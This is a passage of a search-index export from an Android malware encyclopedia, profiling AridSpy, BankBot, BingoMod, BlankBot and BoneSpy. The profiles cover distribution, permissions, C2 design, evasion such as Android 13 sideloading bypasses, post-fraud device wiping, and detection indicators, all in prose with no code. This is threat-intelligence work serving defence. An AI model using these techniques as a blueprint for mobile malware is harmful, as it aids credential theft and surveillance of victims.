Channels","text":"Channel Purpose Firebase C2 Receives commands and configuration updates Hardcoded C2 domain Data exfiltration endpoint, separate from the command channel <p>The separation of command and exfiltration infrastructure mirrors patterns seen in other sophisticated Android malware families, making takedown of one channel insufficient to disrupt the full operation.</p>"},{"location":"malware/families/aridspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/aridspy/#security-software-detection","title":"Security Software Detection","text":"<p>Before downloading the first-stage payload, the trojanized app checks whether security software is installed on the device. If detected, the app does not proceed with payload delivery. This is a simple but effective gate: devices without antivirus installed receive the full payload chain, while security researchers' test devices may not trigger the download.</p>"},{"location":"malware/families/aridspy/#aes-encryption","title":"AES Encryption","text":"<p>The first-stage payload is encrypted with AES using a hardcoded key embedded in the trojanized app. While this protects the payload in transit and on disk before installation, the hardcoded key means any analyst with a sample of the trojanized app can decrypt the payload. The encryption serves primarily as an evasion layer against automated scanning rather than protection against targeted analysis.</p>"},{"location":"malware/families/aridspy/#camera-capture-logic","title":"Camera Capture Logic","text":"<p>AridSpy's camera capture is throttled to avoid draining the battery or alerting the victim. Photos are taken only when the screen is locked or unlocked, with a minimum interval of 40 minutes between captures and a battery threshold of 15%. The default camera is front-facing, but the operator can switch to the rear camera via a Firebase command.</p>"},{"location":"malware/families/aridspy/#version-tracking","title":"Version Tracking","text":"<p>AridSpy embeds a version number in the filenames of exfiltrated data. ESET noted that this versioning has been consistent across campaigns, including earlier 2021 variants, suggesting a continuously maintained codebase rather than one-off builds.</p>"},{"location":"malware/families/aridspy/#target-regions","title":"Target Regions","text":"Region Details Palestine Primary target; Palestinian Civil Registry app campaign, messaging app campaigns Egypt Secondary target; messaging app campaigns <p>Arid Viper's targeting aligns with Palestinian political and intelligence interests. The Palestinian Civil Registry campaign is specifically designed for targets within Palestine, while the trojanized messaging apps cast a wider net across Palestine and Egypt.</p>"},{"location":"malware/families/aridspy/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022: AridSpy campaigns begin distributing trojanized messaging apps through dedicated websites. LapizaChat (based on StealthChat), NortirChat (based on Session), and ReblyChat (based on Voxer) are deployed across separate campaigns.</p> <p>2022-2024: A fake job opportunity app is distributed via a dedicated website, targeting job seekers in the region.</p> <p>2022-2024: The Palestinian Civil Registry campaign launches, using a custom-built app that returns real civil registry data while deploying AridSpy's multistage payload chain. This campaign registers the majority of Palestine-based infections.</p> <p>June 2024: ESET publishes the full technical analysis of AridSpy, documenting five campaigns, three of which remain active at the time of publication. The research details the multistage architecture, trojanized app list, and espionage capabilities.</p>"},{"location":"malware/families/aridspy/#related-families","title":"Related Families","text":"<p>AridSpy is the latest in Arid Viper's Android tooling lineage. SentinelOne previously documented the group's SpyC23 family, which shared the same operational focus on Middle Eastern targets but lacked AridSpy's multistage payload architecture.</p> <p>Within the broader Android spyware landscape, AridSpy's multistage approach parallels Predator's Alien-loader-to-Predator-implant chain and Hermit's modular architecture. All three separate the initial delivery from the espionage payload, though through different mechanisms. Predator uses exploit chains for delivery, Hermit relies on ISP-level network injection, and AridSpy uses trojanized functional apps on phishing websites.</p> <p>The trojanized messaging app strategy shares similarities with PJobRAT, which also distributes fake chat apps for espionage. Both families target specific regions with social engineering tailored to local contexts, and both prioritize WhatsApp and messaging data extraction. The key difference is architectural: PJobRAT bundles all functionality in a single app, while AridSpy distributes its capabilities across multiple stages.</p> <p>AridSpy's keylogging across all applications, camera capture on device events, and notification monitoring place it in the same capability tier as commercial spyware like FinSpy, though its distribution relies entirely on social engineering rather than exploit delivery.</p>"},{"location":"malware/families/aridspy/#references","title":"References","text":""},{"location":"malware/families/bankbot/","title":"BankBot","text":"<p>BankBot holds a unique position in Android malware history: it was the first banking trojan whose complete source code was published openly on an underground forum, giving any motivated actor a working credential-theft toolkit with minimal effort. Everything that followed in the Android banking trojan space, from Anubis to Cerberus, traces at least part of its lineage to the code maza-in shared in December 2016.</p>"},{"location":"malware/families/bankbot/#overview","title":"Overview","text":"Property Value First Seen December 2016 (source published on exploit.in) Last Seen / Status Active variants through late 2018; codebase lives on through descendants Type Banking trojan Attribution \"maza-in\" (initial author); numerous independent operators post-publication Aliases BankBotAlpha (Fortinet designation for earliest variant), Android.BankBot.149.origin (Dr.Web), MazaBot"},{"location":"malware/families/bankbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>On December 19, 2016, a Russian-speaking actor known as \"maza-in\" published a tutorial called \"Android BOT from scratch\" on the exploit.in forum. The post included full source code for both the Android client application and the PHP C2 panel. As Fortinet's analysis documents, maza-in claimed over 10 years of development experience and framed the release as educational, but the tutorial included antivirus cross-scanning results that were continuously updated, confirming malicious intent.</p> <p>Dr.Web detected the first in-the-wild variant in January 2017, cataloging it as Android.BankBot.149.origin. Because both the Android APK source and the server-side panel were freely available, variants proliferated rapidly. Fortinet distinguished between the original \"BankBotAlpha\" and its evolved descendants: the strings, C2 commands, and even typos remained consistent across versions, but later variants added anti-analysis, obfuscation, and expanded target lists.</p> <p>Maza-in continued private development of the codebase, eventually producing Anubis as a significantly enhanced commercial version. Meanwhile, independent actors forked BankBot in various directions throughout 2017-2018. The Check Point end-to-end analysis documented how the open availability of BankBot source transformed the Android threat landscape by removing the development barrier entirely.</p>"},{"location":"malware/families/bankbot/#distribution","title":"Distribution","text":"<p>BankBot operators demonstrated early success at bypassing Google Play's Bouncer scanner:</p> <p>Google Play campaigns: Trojanized apps disguised as flashlight utilities, solitaire games, and device cleaners repeatedly landed on Google Play. Avast, ESET, and SfyLabs jointly reported that the \"Tornado FlashLight\" app (first spotted October 13, 2017) was followed by \"Lamp For DarkNess\" and \"Sea FlashLight,\" all carrying BankBot payloads.</p> <p>Dropper technique: ThreatFabric documented sophisticated dropper campaigns where apps exhibited legitimate functionality for an extended period before activating malicious behavior. The droppers abused Accessibility Service to silently enable installation from unknown sources and request Device Admin privileges.</p> <p>Third-party stores: Beyond Google Play, BankBot APKs circulated through third-party app stores and direct download links distributed via SMS phishing.</p> <p>ESET tracked a September 2017 variant as the first to combine improved code obfuscation, payload-dropping functionality, and Accessibility Service abuse in a single infection chain on Google Play.</p>"},{"location":"malware/families/bankbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/bankbot/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Overlay injection Displays fake login UI over legitimate banking apps when launched SMS interception Intercepts and hides incoming SMS for OTP/2FA theft SMS sending Sends SMS from victim device (premium SMS fraud, worm-like spreading) Contact theft Exfiltrates device contact list Call forwarding Redirects incoming calls Device tracking Reports GPS location to C2 App list enumeration Reports installed applications to C2 for target matching Device Admin abuse Requests admin privileges to resist uninstallation"},{"location":"malware/families/bankbot/#bankbotalpha-vs-bankbot-evolution","title":"BankBotAlpha vs. BankBot Evolution","text":"Feature BankBotAlpha (Dec 2016) BankBot (2017+) Target list Hardcoded in <code>StartWhile</code> class Fetched dynamically from C2 Banking apps targeted ~20 Russian banks 150-420+ banks across 27+ countries Obfuscation None String encryption, code obfuscation, delayed payload activation Accessibility abuse Minimal Full Accessibility Service for silent installs, UI manipulation Anti-analysis None Emulator detection, delayed activation to evade sandbox analysis Distribution Side-loading Google Play droppers, third-party stores"},{"location":"malware/families/bankbot/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Silent install from unknown sources, UI manipulation, overlay injection (2017+ variants) SYSTEM_ALERT_WINDOW Display overlay windows over banking apps (pre-Android 8) BIND_DEVICE_ADMIN Device admin for persistence and anti-uninstall READ_SMS SMS interception for OTP/2FA theft RECEIVE_SMS Real-time SMS interception SEND_SMS Premium SMS fraud, worm-like spreading via contact list READ_CONTACTS Contact exfiltration READ_PHONE_STATE Device fingerprinting (IMEI, phone number) CALL_PHONE Call forwarding ACCESS_FINE_LOCATION GPS location tracking INTERNET HTTP C2 communication RECEIVE_BOOT_COMPLETED Restart after device reboot REQUEST_INSTALL_PACKAGES Install additional payloads (dropper variants)"},{"location":"malware/families/bankbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/bankbot/#c2-communication","title":"C2 Communication","text":"<p>BankBot communicates with its C2 server over HTTP. The bot registers with device metadata (IMEI, phone number, installed apps, OS version) and polls for commands at configurable intervals. The C2 panel, written in PHP, provides operators with a web interface for managing bots, pushing overlay templates, and viewing exfiltrated credentials.</p> <p>Commands are issued as plaintext strings in early versions. Later variants introduced basic encryption of the request/response body. Fortinet noted that the C2 command set remained largely stable across variants, with identical command strings and even consistent grammatical errors in the code.</p>"},{"location":"malware/families/bankbot/#overlay-mechanism","title":"Overlay Mechanism","text":"<p>BankBot monitors running applications and matches them against its target list. When a targeted banking app is detected in the foreground, BankBot pushes a WebView overlay that visually replicates the app's login screen. Credentials entered into the overlay are transmitted to the C2. Early versions hardcoded the target list and overlay HTML; later versions fetched both dynamically.</p> <p>The overlay injection relies on either <code>TYPE_SYSTEM_ALERT</code> window type (pre-Android 8) or Accessibility Service-based injection (Android 8+). This shift was a direct response to Google restricting <code>SYSTEM_ALERT_WINDOW</code> permissions.</p>"},{"location":"malware/families/bankbot/#persistence","title":"Persistence","text":"<p>BankBot requests Device Admin privileges during initial setup. If granted, the malware cannot be uninstalled through normal means without first revoking admin status. Some variants also register as the default SMS handler to maintain SMS interception across device reboots.</p>"},{"location":"malware/families/bankbot/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Protocol HTTP (plaintext in early versions, basic encryption in later variants) Panel PHP-based web interface for bot management, credential viewing, command dispatch Registration Device metadata sent on first contact (IMEI, phone number, installed apps, OS version) Command polling Configurable interval HTTP polling for new instructions Overlay hosting HTML templates for WebView overlays (hardcoded in early versions, C2-served in later variants) Source availability Full panel and bot source code publicly available from December 2016"},{"location":"malware/families/bankbot/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>BankBot's open-source nature meant target lists varied widely by operator. The most comprehensive campaigns spanned:</p> Region Notable Targets North America Wells Fargo, Chase, Citibank Europe DiBa, banks in Germany, France, Spain, Portugal, Poland, Greece, Netherlands Turkey Major Turkish banking apps Australia Major Australian banking apps Russia Sberbank, other Russian banks (initial BankBotAlpha targets) Southeast Asia Banks in Singapore, Philippines Latin America Banks in Dominican Republic <p>Avast reported that a single late-2017 campaign targeted users across the U.S., Australia, Germany, Netherlands, France, Poland, Spain, Portugal, Turkey, Greece, Russia, Dominican Republic, Singapore, and Philippines.</p>"},{"location":"malware/families/bankbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2017, first wild variants: Dr.Web cataloged Android.BankBot.149.origin as the first BankBot variant observed in the wild, within weeks of the source code publication. Targeting focused on Russian banking apps.</p> <p>April 2017, Google Play infiltration: Check Point documented BankBot variants posing as entertainment and banking apps on Google Play, targeting 20+ banks in 27 countries. This marked the beginning of BankBot's repeated success at bypassing Google Play screening.</p> <p>May 2017, ThreatFabric botnet analysis: ThreatFabric uncovered a botnet of 5,499 infected devices running BankBot. A single C2 server contained 276 harvested banking credential sets. The campaign targeted 420+ banking applications with overlay templates.</p> <p>September 2017, ESET accessibility variant: ESET identified the first BankBot variant on Google Play to combine code obfuscation, dropper functionality, and Accessibility Service abuse in a single infection chain.</p> <p>October-November 2017, flashlight/solitaire wave: A joint investigation by Avast, ESET, and SfyLabs revealed BankBot hidden in flashlight and solitaire apps. Some of these apps also dropped secondary payloads including Mazar Bot and Red Alert malware, demonstrating multi-family dropper coordination.</p>"},{"location":"malware/families/bankbot/#evolution","title":"Evolution","text":"Phase Period Key Changes Source publication December 2016 Full Android client + PHP panel published on exploit.in by maza-in First wild variants January 2017 Basic overlay attacks targeting ~20 Russian banks Google Play infiltration April-May 2017 Dropper apps on Google Play, 420+ bank targets, 27+ countries Accessibility abuse September 2017 Silent installs, UI manipulation, improved obfuscation Multi-family droppers October-November 2017 BankBot apps dropping secondary payloads (Mazar Bot, Red Alert) Superseded by Anubis Late 2017-2018 Maza-in's private development fork becomes Anubis Legacy 2018+ Direct variants decline as operators migrate to more capable successors"},{"location":"malware/families/bankbot/#detection","title":"Detection","text":"Indicator Type Details Device Admin request App requesting device administrator without MDM functionality Overlay windows <code>TYPE_SYSTEM_ALERT</code> windows rendered over banking apps (pre-Android 8) SMS handler registration App registering as default SMS handler Accessibility abuse App using accessibility service to silently enable unknown sources and grant device admin C2 command strings Consistent command strings and grammatical errors across variants (identifiable pattern) Delayed activation App exhibiting normal behavior for days before activating malicious functionality"},{"location":"malware/families/bankbot/#related-families","title":"Related Families","text":"Family Relationship Anubis Direct successor. Maza-in continued private development of BankBot into Anubis, adding keylogging, screen recording, VNC, and ransomware. GodFather Second-generation descendant. Built on the leaked Anubis source, which itself evolved from BankBot. Cerberus Influenced by BankBot's open-source model. Cerberus adopted similar overlay injection techniques and later had its own source leaked. Ermac Third-generation descendant through the Cerberus leak lineage, inheriting overlay and credential-theft patterns that trace back to BankBot."},{"location":"malware/families/bankbot/#references","title":"References","text":"<ul> <li>Fortinet - BankBot: The Prequel</li> <li>Fortinet - A Look Into the New Strain of BankBot</li> <li>Dr.Web - Android.BankBot.149.origin (January 2017)</li> <li>Check Point - The Mobile Banker Threat From End to End</li> <li>Avast - Mobile Banking Trojan Sneaks Into Google Play (November 2017)</li> <li>ESET - Banking Trojan Returns to Google Play (September 2017)</li> <li>ThreatFabric - Sophisticated Google Play BankBot Trojan Campaigns</li> </ul>"},{"location":"malware/families/bingomod/","title":"BingoMod","text":"<p>BingoMod is an Android remote access trojan (RAT) focused on on-device fraud and post-fraud evidence destruction. Cleafy discovered the family in July 2024, identifying active campaigns dating back to late May 2024. BingoMod combines VNC-like remote access with overlay attacks, approximately 40 C2 commands, and a device-wiping capability reminiscent of BRATA's factory reset kill switch. Distributed through smishing campaigns disguised as antivirus or mobile security applications, BingoMod performs Account Takeover (ATO) via on-device fraud, then wipes the victim's device to destroy forensic evidence. Romanian-language comments found throughout the source code suggest the developers may be Romanian, though attribution remains unconfirmed.</p>"},{"location":"malware/families/bingomod/#overview","title":"Overview","text":"Attribute Details First Seen Late May 2024 Status Active, under development Type Banking RAT, on-device fraud Attribution Possibly Romanian developers (Romanian code comments) Distribution Smishing, fake antivirus/security apps"},{"location":"malware/families/bingomod/#origin-and-lineage","title":"Origin and Lineage","text":"<p>BingoMod does not share a direct code lineage with any known Android banking trojan family. Cleafy's analysis identified it as an independently developed project. However, the malware borrows operational concepts from established families:</p> Concept Precedent Device wiping after fraud BRATA introduced factory reset as evidence destruction in January 2022 VNC-like remote access Octo, Hook, and other device-takeover trojans use screen streaming for ODF Overlay attacks Standard technique across the banking trojan ecosystem Fake security app distribution Common distribution theme used by BRATA and others <p>The device-wiping capability is the most notable borrowed concept. BRATA first deployed factory reset as evidence destruction in 2022, and its descendant Copybara continued the approach. BingoMod independently implements the same strategy, suggesting the developers studied existing families and incorporated proven techniques.</p> <p>Romanian-language code comments throughout the source provide a potential attribution lead. The comments appear in variable names, function descriptions, and inline annotations, suggesting the primary developer writes in Romanian rather than using a translation tool.</p>"},{"location":"malware/families/bingomod/#distribution","title":"Distribution","text":"<p>BingoMod distributes exclusively through smishing campaigns. The lures consistently impersonate mobile security or antivirus applications.</p> Vector Details Smishing SMS messages with links to download fake security apps Fake antivirus apps APKs disguised as mobile security tools, antivirus scanners, or Chrome updates App icons Uses icons from legitimate security apps to appear trustworthy"},{"location":"malware/families/bingomod/#lure-themes","title":"Lure Themes","text":"<p>Cleafy documented several app names used in distribution:</p> Fake App Name Impersonation APP Protection Generic antivirus Antivirus Cleanup Security scanner Chrome Update Browser update InfoWeb Utility app SicurezzaWeb Italian security app WebSecurity Security tool WebsInfo Information utility WebInfo Information utility <p>The variety of names suggests active experimentation with lure themes. The inclusion of Italian-language app names (\"SicurezzaWeb\") alongside English ones indicates targeting of both Italian and English-speaking users.</p>"},{"location":"malware/families/bingomod/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/bingomod/#core-features","title":"Core Features","text":"Capability Implementation VNC-like remote access Real-time screen streaming and remote interaction via accessibility service Overlay attacks Credential phishing overlays displayed over target banking apps SMS interception Reads, intercepts, and forwards SMS for OTP capture Device wiping Factory resets or wipes external storage after successful fraud Keylogging Accessibility-based keystroke capture Screen capture Screenshots of active applications Notification interception Monitors and suppresses notifications App management List installed apps, launch specific applications"},{"location":"malware/families/bingomod/#on-device-fraud-odf","title":"On-Device Fraud (ODF)","text":"<p>BingoMod performs Account Takeover through on-device fraud. The operator connects to the victim's device via the VNC-like remote access channel and directly interacts with the victim's banking application:</p> <ol> <li>Operator initiates remote session via C2</li> <li>Accessibility service provides real-time screen content to the operator</li> <li>Operator navigates to banking app and initiates wire transfer</li> <li>SMS interception captures any OTP sent by the bank</li> <li>Operator completes the transaction using captured OTP</li> <li>Device wipe command sent after successful transfer</li> </ol>"},{"location":"malware/families/bingomod/#device-wiping","title":"Device Wiping","text":"<p>The device-wiping capability serves two purposes: evidence destruction and victim confusion. After a successful fraudulent transfer, BingoMod can:</p> <ul> <li>Perform a factory reset of the device (requires device admin privileges)</li> <li>Wipe external storage contents</li> </ul> <p>This destroys the malware itself along with any forensic artifacts on the device. The victim is left with a wiped phone and must recover their device before they can check their bank account, buying the attacker time to move stolen funds through money mule networks.</p>"},{"location":"malware/families/bingomod/#c2-command-set","title":"C2 Command Set","text":"<p>Cleafy identified approximately 40 distinct C2 commands, spanning:</p> Category Commands Remote control Screen streaming, tap, swipe, text input, gesture simulation Data theft SMS reading, contact exfiltration, app listing Fraud support Overlay injection, notification interception, OTP capture Persistence Disable battery optimization, prevent uninstallation Evidence destruction Factory reset, storage wipe Device management Lock screen, mute audio, launch apps"},{"location":"malware/families/bingomod/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/bingomod/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>BingoMod depends on Android's accessibility service for its core functionality:</p> Function Accessibility Usage Screen streaming Captures screen content for operator viewing Remote input Simulates taps, swipes, and text entry Overlay triggering Detects foreground application changes Keylogging Records input across all applications Permission auto-granting Automatically approves runtime permission dialogs Uninstall prevention Intercepts and dismisses settings/uninstall navigation"},{"location":"malware/families/bingomod/#anti-analysis","title":"Anti-Analysis","text":"<p>BingoMod implements several anti-analysis techniques, with Cleafy noting that this area is under active development:</p> Technique Implementation Code obfuscation Flattened code structure to complicate static analysis String encryption Sensitive strings encrypted and decrypted at runtime Dynamic payloads Overlay pages and configuration retrieved from C2 post-install Emulator detection Checks for virtual environment indicators <p>The \"under development\" characterization from Cleafy indicates that BingoMod's authors are actively investing in evasion. Future versions are likely to incorporate more sophisticated anti-analysis measures as the malware matures.</p>"},{"location":"malware/families/bingomod/#c2-communication","title":"C2 Communication","text":"<p>BingoMod uses socket-based communication for real-time remote control sessions alongside HTTP for registration and data exfiltration:</p> Protocol Usage HTTP Bot registration, configuration retrieval, data upload Socket Real-time remote control sessions, screen streaming"},{"location":"malware/families/bingomod/#target-regions","title":"Target Regions","text":"Region Evidence Italy Italian-language lure app names (\"SicurezzaWeb\"), overlay targets Europe (broader) English-language lures suggesting wider European targeting <p>Cleafy's analysis identified Italian-language fake app names and banking overlay targets consistent with Italian financial institutions. English-language lure themes indicate the operators are also targeting or planning to target English-speaking markets. The active development status suggests geographic expansion is likely.</p>"},{"location":"malware/families/bingomod/#notable-campaigns","title":"Notable Campaigns","text":"<p>Late May 2024: BingoMod campaigns begin. The malware distributes through smishing with fake antivirus and security app lures. Cleafy identifies multiple APK variants using different app names and icons to impersonate security tools.</p> <p>July 2024: Cleafy publishes the full technical analysis of BingoMod, documenting the VNC-like remote access, ~40 C2 commands, device-wiping capability, and Romanian code comments. The publication highlights BingoMod as an active threat under continued development with growing anti-analysis capabilities.</p>"},{"location":"malware/families/bingomod/#related-families","title":"Related Families","text":"<p>BingoMod's device-wiping behavior directly parallels BRATA, which introduced factory reset as evidence destruction in January 2022. Cleafy documented BRATA's <code>byebye_format</code> command that wiped devices after completing fraudulent wire transfers. BingoMod implements the same concept independently. Copybara, which evolved from the BRATA ecosystem, also retains aspects of this destructive approach.</p> <p>The VNC-like remote access capability places BingoMod in the same operational category as Octo (MediaProjection-based screen streaming), Hook (VNC + accessibility remote control), and Vultur (AlphaVNC-based screen streaming). All of these families perform on-device fraud by giving operators real-time interactive access to the victim's device rather than relying solely on overlay attacks for credential theft.</p> <p>BingoMod's distribution through fake security app lures is a pattern shared with earlier BRATA campaigns, where McAfee documented variants on Google Play posing as app security scanners.</p>"},{"location":"malware/families/bingomod/#references","title":"References","text":""},{"location":"malware/families/blankbot/","title":"BlankBot","text":"<p>BlankBot is an Android banking trojan discovered by Intel 471 on July 24, 2024, primarily targeting Turkish users with screen recording, keylogging via a custom virtual keyboard, and customizable overlay injections. The malware was still under active development when Intel 471 published their analysis, evidenced by multiple code variants across samples, extensive logging, and unfinished functionality. BlankBot uses a session-based package installer to bypass Android 13 restrictions on sideloaded app permissions, a technique also observed in Mandrake, and communicates with its C2 over WebSocket for real-time command execution.</p>"},{"location":"malware/families/blankbot/#overview","title":"Overview","text":"Attribute Details First Seen Late June 2024 (earliest samples) Status Active, under development Type Banking trojan Aliases None known Attribution Unknown Distribution Fake utility applications"},{"location":"malware/families/blankbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Intel 471 Malware Intelligence researchers identified BlankBot on July 24, 2024, when analyzing Android samples disguised as utility applications that could not be attributed to any known malware family. The earliest samples dated to late June 2024, and almost all were undetected by antivirus engines on VirusTotal at the time of discovery.</p> <p>The code showed clear signs of active, ongoing development. Intel 471 observed significant variation between samples, with different code paths, logging output, and partially implemented features across builds. This pattern indicated a developer or team iterating rapidly on the codebase rather than maintaining a stable, production-ready product. Despite the unfinished state, the functional capabilities already present (screen recording, keylogging, overlays, remote control) made BlankBot operationally viable against targets.</p> <p>Zimperium subsequently analyzed BlankBot and confirmed that the trojan could not evade on-device machine learning protections, suggesting that its evasion capabilities lagged behind its operational features during the early development phase.</p>"},{"location":"malware/families/blankbot/#distribution","title":"Distribution","text":"Vector Details Fake utility apps Samples disguised as utility applications with Turkish-language names and strings <p>BlankBot distribution relies on impersonating utility applications. Based on application names and embedded strings, Intel 471 assessed that the primary targets were Turkish Android users. The specific delivery mechanism (phishing, malvertising, or third-party app stores) was not detailed in the initial reporting, though the trojan's reliance on sideloading aligns with common distribution through SMS phishing or malicious websites.</p>"},{"location":"malware/families/blankbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/blankbot/#core-features","title":"Core Features","text":"Capability Implementation Custom keyboard keylogging Deploys its own virtual keyboard via InputMethodService to capture all keystrokes Screen recording Uses MediaProjection and MediaRecorder APIs to capture screen content as Base64-encoded JPEG images Custom overlay injections Creates tailored overlay windows over legitimate apps to steal banking credentials, card data, and personal information SMS interception Reads and exfiltrates SMS messages from the device Contact list harvesting Collects the victim's contact database App inventory Enumerates all installed applications on the device App management Can uninstall arbitrary applications or launch specific apps Remote gestures Executes taps, swipes, and navigation commands on the device"},{"location":"malware/families/blankbot/#custom-keyboard-keylogging","title":"Custom Keyboard Keylogging","text":"<p>BlankBot's most distinctive feature is its custom virtual keyboard for keystroke capture. Rather than relying solely on accessibility service event monitoring (the standard approach for most Android banking trojans), BlankBot implements its own InputMethodService that replaces the device's keyboard. This approach parallels the technique used by Frogblight, which also implements a custom InputMethodService for keylogging. By controlling the keyboard itself, BlankBot captures every character the victim types regardless of which application is active, bypassing protections that some banking apps implement to detect accessibility-based keyloggers.</p>"},{"location":"malware/families/blankbot/#screen-recording","title":"Screen Recording","text":"<p>BlankBot leverages Android's MediaProjection API to initiate screen capture and the MediaRecorder API to record the output. Captured screen content is encoded as Base64 JPEG images and transmitted to the C2 server. This provides operators with visual confirmation of victim activity, overlay effectiveness, and any on-screen data that keylogging alone would not capture (such as autofilled credentials or biometric prompts).</p>"},{"location":"malware/families/blankbot/#custom-overlay-injections","title":"Custom Overlay Injections","text":"<p>The trojan creates customizable overlay windows that render on top of legitimate banking and financial applications. These overlays present fake input fields designed to mimic the target application's login or payment interface, soliciting banking credentials, payment card details, and personal information. The overlays are served from the C2, allowing operators to update phishing templates without pushing new malware builds to infected devices.</p>"},{"location":"malware/families/blankbot/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Remote gesture execution, overlay triggering, UI monitoring SYSTEM_ALERT_WINDOW Custom overlay windows for credential theft READ_SMS SMS message exfiltration RECEIVE_SMS Real-time SMS interception for OTP theft READ_CONTACTS Contact list harvesting READ_PHONE_STATE Device fingerprinting QUERY_ALL_PACKAGES Enumerate all installed applications REQUEST_INSTALL_PACKAGES Session-based package installer for payload deployment REQUEST_DELETE_PACKAGES Uninstall arbitrary applications INTERNET HTTP and WebSocket C2 communication FOREGROUND_SERVICE Persistent background operation RECEIVE_BOOT_COMPLETED Restart after device reboot WAKE_LOCK Keep device active during screen recording and remote control"},{"location":"malware/families/blankbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/blankbot/#android-13-restriction-bypass","title":"Android 13 Restriction Bypass","text":"<p>BlankBot uses a session-based package installer to circumvent restrictions introduced in Android 13 that prevent sideloaded applications from requesting dangerous permissions (particularly accessibility service access). The malware first prompts the victim to allow installation from third-party sources, then retrieves an unencrypted APK from its assets directory and initiates installation through the session-based installer API. This technique, also employed by Mandrake, exploits the fact that session-based installations are treated differently by Android's permission framework than standard sideloaded installs.</p>"},{"location":"malware/families/blankbot/#c2-communication","title":"C2 Communication","text":"<p>BlankBot establishes initial contact with its C2 server by sending device information in an HTTP GET request. After this handshake, communication switches to the WebSocket protocol for persistent, bidirectional messaging. Bot commands received over WebSocket control all major functions: starting and stopping screen recording, executing gestures, creating overlay windows, collecting device data, and managing applications on the device.</p>"},{"location":"malware/families/blankbot/#development-indicators","title":"Development Indicators","text":"<p>Intel 471's analysis noted several indicators of active development across BlankBot samples:</p> <ol> <li>Multiple code variants with divergent implementations of the same features</li> <li>Extensive debug logging left in production builds</li> <li>Partially implemented functionality alongside fully operational modules</li> <li>Variation in obfuscation levels between samples</li> </ol>"},{"location":"malware/families/blankbot/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Initial handshake HTTP GET request with device information Persistent channel WebSocket protocol for bidirectional command and control Screen data format Base64-encoded JPEG images transmitted over WebSocket Command delivery WebSocket messages for screen recording control, gesture execution, overlay management, data collection Overlay templates Served from C2, allowing remote updates without new APK builds"},{"location":"malware/families/blankbot/#target-regions","title":"Target Regions","text":"Period Primary Targets June-July 2024 Turkish Android users <p>Application names, UI strings, and embedded language resources all point to Turkish users as the primary targets. The trojan's overlay injection framework is generic enough to target applications in any region, and given BlankBot's active development trajectory, expansion beyond Turkey is a natural progression.</p>"},{"location":"malware/families/blankbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2024: Intel 471 disclosed BlankBot after discovering multiple samples disguised as utility applications targeting Turkish users. The trojan was under active development with multiple code variants, but already featured functional screen recording, custom keyboard keylogging, overlay injections, and WebSocket-based remote control. Nearly all samples were undetected by antivirus scanners at the time of discovery.</p> <p>August 2024: Zimperium published a supplementary analysis confirming BlankBot's capabilities and noting that the trojan could not evade on-device machine learning detection, providing a detection advantage for devices with ML-based security solutions deployed.</p>"},{"location":"malware/families/blankbot/#related-families","title":"Related Families","text":"Family Relationship Frogblight Both implement custom InputMethodService keyboards for keylogging rather than relying solely on accessibility event monitoring. Frogblight is also a Turkish-focused banking trojan. Mandrake Both use session-based package installation to bypass Android 13 sideloading restrictions on dangerous permissions. Antidot Both use WebSocket for C2 communication and combine overlay attacks with remote device control, though Antidot adds VNC-based screen streaming rather than screen recording. Brokewell Both were under rapid, active development when first discovered, with near-daily capability additions. Both combine screen capture with remote control. Crocodilus Both bypass Android 13+ restrictions on sideloaded app permissions, though through different mechanisms."},{"location":"malware/families/blankbot/#detection","title":"Detection","text":"Indicator Type Details Custom keyboard App registering an <code>InputMethodService</code> without being a legitimate keyboard application MediaProjection abuse Screen capture permissions requested by a utility app Session-based installation Use of <code>PackageInstaller.Session</code> API to bypass Android 13 sideloading restrictions WebSocket traffic Persistent WebSocket connections to unknown servers from a utility app Debug logging Excessive <code>Log</code> calls in production builds (early samples) Turkish-language resources Application names and strings in Turkish"},{"location":"malware/families/blankbot/#references","title":"References","text":"<ul> <li>Intel 471 - BlankBot: A New Android Banking Trojan (July 2024)</li> <li>Zimperium - BlankBot: New Android Banking Trojan (August 2024)</li> </ul>"},{"location":"malware/families/bonespy/","title":"BoneSpy","text":"<p>BoneSpy is an Android surveillanceware family discovered by Lookout in December 2024, originally attributed to Gamaredon (also tracked as Primitive Bear and Shuckworm, a Russian FSB-linked APT group). Lookout subsequently reattributed BoneSpy and its companion family PlainGnome to Sandcat, a threat actor associated with Uzbekistan's State Security Service (SSS). The initial Gamaredon attribution was based on dynamic DNS provider usage and IP address overlaps between mobile and desktop C2 infrastructure. BoneSpy is derived from the open-source Russian surveillance application DroidWatcher (developed 2013-2014), sharing nearly identical code, class names, and log messages for database handling related to call logs, location tracking, SMS, notifications, and browser bookmarks. Active since at least 2021, BoneSpy targets Russian-speaking victims in Central Asian former Soviet states, primarily Uzbekistan, Kazakhstan, Tajikistan, and Kyrgyzstan. Distribution relies on trojanized Telegram apps, fake Samsung Knox apps, and social engineering lures. BoneSpy and PlainGnome represent the first known mobile malware families linked to the Gamaredon/Sandcat operational space, which previously focused exclusively on Windows-based operations.</p>"},{"location":"malware/families/bonespy/#quick-reference","title":"Quick Reference","text":"Attribute Details First Seen 2021 Last Seen Active as of December 2024 Status Active Type Surveillanceware Attribution Originally Gamaredon (FSB-linked); reattributed to Sandcat (Uzbekistan SSS) Aliases None known Lineage Based on DroidWatcher open-source surveillance app (2013-2014) Distribution Trojanized Telegram apps, fake Samsung Knox, battery monitoring lures, photo gallery lures Related PlainGnome (companion family by same operator)"},{"location":"malware/families/bonespy/#capabilities","title":"Capabilities","text":"Capability Details SMS collection 